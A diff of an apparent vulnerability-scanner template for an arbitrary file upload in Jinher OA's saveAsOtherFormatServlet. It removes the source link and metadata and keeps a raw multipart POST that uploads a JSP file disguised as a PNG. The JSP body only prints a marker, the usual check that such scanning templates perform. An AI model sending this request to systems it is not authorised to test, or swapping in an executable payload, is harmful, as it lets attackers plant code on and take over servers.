@@ -3,12 +3,8 @@ info:
   name: 金和OA saveAsOtherFormatServlet文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/px2xmawt1euv3qkc'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: px2xmawt1euv3qkc
-    fofa: 暂无
 http:
 - raw:
   - 'POST /jc6/servlet/saveAsOtherFormatServlet?fileName=dudesuite.jsp HTTP/1.1
@@ -32,8 +28,6 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
 
-
-
     ------WebKitFormBoundary
 
 
@@ -41,8 +35,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     <% out.println("111");%>
